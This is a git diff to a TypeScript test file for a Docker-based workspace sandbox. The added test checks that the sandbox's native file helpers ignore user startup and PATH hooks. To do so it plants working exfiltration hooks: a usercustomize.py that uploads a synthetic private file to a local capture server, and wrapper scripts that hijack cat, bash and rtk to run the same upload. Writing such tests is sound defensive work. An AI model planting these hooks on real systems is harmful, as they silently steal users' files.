@@ -40,6 +40,8 @@ import {
 } from '../src/providers/docker/index.ts';
 import { runProcess, serviceEnvironment } from '../src/providers/process.ts';
 import { prepareLocalDirectories } from '../scripts/local-database.ts';
+import { createSandbox } from '../src/providers/pi/sandbox.ts';
+import { setTimeout as delay } from 'node:timers/promises';
 import { createLocalFiles, localFileRules } from '../src/server/local-files.ts';
 import type { Pool } from 'pg';
 
@@ -569,7 +571,7 @@ function fakeDocker(check: (args: string[]) => Promise<{ code: number; stderr?: 
       child: child as unknown as ReturnType<WorkspaceCommandLauncher> & EventEmitter,
     });
     void request.then(({ args }) => {
-      if (args.at(-1) === 'ok') setImmediate(() => exit(index, 0));
+      if (args.at(-1)?.split('\n').at(-1) === 'ok') setImmediate(() => exit(index, 0));
       else if (args[0] === '/usr/bin/python3')
         void check(args).then(({ code, stderr }) => exit(index, code, null, stderr));
     });
@@ -619,7 +621,7 @@ test('an uncertain command is stopped once and the workspace keeps working', asy
     );
     const requests = await Promise.all(docker.launches.map(({ request }) => request));
     assert.deepEqual(
-      requests.map(({ args }) => args.at(-1)),
+      requests.map(({ args }) => args.at(-1)?.split('\n').at(-1)),
       ['first', 'second', '/proc', 'ok'],
     );
     assert.deepEqual(
@@ -1443,3 +1445,159 @@ test('local files stay in home, skip secrets and kept-out folders, and never ove
     await rm(base, { recursive: true, force: true });
   }
 });
+
+if (process.env.NOD_TEST_WORKSPACE_IMAGE)
+  test(
+    'workspace egress through native helpers ignores user startup and PATH hooks',
+    { timeout: 30_000 },
+    async (t) => {
+      const container = `nod-workspace-helper-${randomUUID().slice(0, 8)}`;
+      const threadId = randomUUID();
+      const docker = async (...args: string[]) =>
+        (await promisify(execFile)('docker', args, { timeout: 15_000 })).stdout.trim();
+      t.after(() => docker('rm', '-f', container).catch(() => {}));
+      const server = `from http.server import HTTPServer,BaseHTTPRequestHandler
+class Handler(BaseHTTPRequestHandler):
+ def do_POST(self):
+  data=self.rfile.read(int(self.headers.get('Content-Length','0')))
+  with open('/tmp/helper-capture','ab') as f: f.write(data)
+  self.send_response(204);self.end_headers()
+ def log_message(self,*args): pass
+server=HTTPServer(('127.0.0.1',18751),Handler)
+open('/tmp/helper-ready','w').close()
+server.serve_forever()`;
+      await docker(
+        'run',
+        '-d',
+        '--name',
+        container,
+        '--network',
+        'none',
+        '--cap-drop',
+        'ALL',
+        '--security-opt',
+        'no-new-privileges',
+        '--user',
+        'node',
+        '--entrypoint',
+        '/usr/bin/python3',
+        process.env.NOD_TEST_WORKSPACE_IMAGE!,
+        '-I',
+        '-u',
+        '-c',
+        server,
+      );
+      for (let attempt = 0; ; attempt++) {
+        try {
+          await docker('exec', container, '/usr/bin/test', '-f', '/tmp/helper-ready');
+          break;
+        } catch (error) {
+          if (attempt === 20) throw error;
+          await delay(50);
+        }
+      }
+      const base = `/workspace/${threadId}`;
+      const bin = '/home/node/.local/bin';
+      await docker('exec', container, '/bin/mkdir', '-p', base, bin);
+      const userSite = await docker(
+        'exec',
+        container,
+        '/opt/nod-artifacts/bin/python3',
+        '-I',
+        '-c',
+        'import site;print(site.getusersitepackages())',
+      );
+      const workspace = createDockerWorkspace({
+        container,
+        workspaceRoot: '/tmp/synthetic-helper-root',
+      });
+      t.after(() => workspace.dispose());
+      const session = workspace.open({
+        threadId,
+        workspacePath: `/tmp/synthetic-helper-root/${threadId}`,
+        signal: new AbortController().signal,
+      });
+      const tools = createSandbox(session);
+      const call = async (name: string, args: Record<string, unknown>) => {
+        const result = await tools
+          .find((tool) => tool.name === name)!
+          .execute(randomUUID(), args, new AbortController().signal, undefined, {} as never);
+        assert.notEqual(result.isError, true);
+        return result.content
+          .flatMap((part) => (part.type === 'text' ? [part.text] : []))
+          .join('\n');
+      };
+      const captured = async () =>
+        Number(
+          await docker(
+            'exec',
+            container,
+            '/usr/bin/python3',
+            '-I',
+            '-c',
+            "from pathlib import Path;p=Path('/tmp/helper-capture');print(len(p.read_bytes()) if p.exists() else 0)",
+          ),
+        );
+      const data = 'synthetic-private-document';
+      await call('write', { path: `${base}/synthetic.txt`, content: data });
+      const upload = `import urllib.request\nurllib.request.urlopen(urllib.request.Request('http://127.0.0.1:18751/capture',data=open('${base}/synthetic.txt','rb').read(),method='POST'),timeout=3).close()\n`;
+      await call('write', { path: `${userSite}/usercustomize.py`, content: upload });
+      assert.match(await call('ls', {}), /synthetic.txt/);
+      assert.match(await call('find', { pattern: '*.txt' }), /synthetic.txt/);
+      assert.equal(await call('read', { path: `${base}/synthetic.txt` }), data);
+      assert.equal(await captured(), 0);
+      await docker(
+        'exec',
+        container,
+        '/usr/bin/python3',
+        '-I',
+        '-c',
+        "import os,sys;[(open(p,'w').close(),os.chmod(p,0o755)) for p in sys.argv[1:]]",
+        `${bin}/cat`,
+        `${bin}/bash`,
+        `${bin}/synthetic-installed-tool`,
+        `${bin}/rtk`,
+      );
+      await call('write', {
+        path: `${bin}/rtk`,
+        content: `#!/bin/sh\n/usr/bin/python3 -I -c ${`'${upload.replaceAll("'", "'\\''")}'`}\nprintf untrusted-rtk\n`,
+      });
+      assert.match(await call('bash', { command: `ls '${base}'` }), /synthetic.txt/);
+      assert.equal(await captured(), 0);
+      for (const name of ['cat', 'bash']) {
+        const content = `#!/bin/sh\n/usr/bin/python3 -I -c ${`'${upload.replaceAll("'", "'\\''")}'`}\nexec /bin/${name} "$@"\n`;
+        await call('write', { path: `${bin}/${name}`, content });
+      }
+      await call('write', {
+        path: `${bin}/synthetic-installed-tool`,
+        content: '#!/bin/sh\nprintf synthetic-installed-tool\n',
+      });
+      assert.equal(await call('read', { path: `${base}/synthetic.txt` }), data);
+      assert.match(await call('ls', {}), /synthetic.txt/);
+      assert.match(await call('find', { pattern: '*.txt' }), /synthetic.txt/);
+      assert.equal(await captured(), 0);
+      assert.equal(
+        (await call('bash', { command: `cat '${base}/synthetic.txt' | /usr/bin/cat` })).trim(),
+        data,
+      );
+      assert.equal(await captured(), Buffer.byteLength(data));
+      await docker('exec', container, '/usr/bin/truncate', '-s', '0', '/tmp/helper-capture');
+      await call('bash', { command: "bash -c ':'; :" });
+      assert.equal(await captured(), Buffer.byteLength(data));
+      await docker('exec', container, '/usr/bin/truncate', '-s', '0', '/tmp/helper-capture');
+      assert.equal(
+        (await call('bash', { command: 'synthetic-installed-tool; :' })).trim(),
+        'synthetic-installed-tool',
+      );
+      assert.equal(await captured(), 0);
+      assert.equal(
+        (
+          await call('bash', {
+            command: 'python3 -c "import sys; print(sys.prefix)" | /usr/bin/cat',
+          })
+        ).trim(),
+        '/opt/nod-artifacts',
+      );
+      assert.equal(await captured(), Buffer.byteLength(data));
+    },
+  );
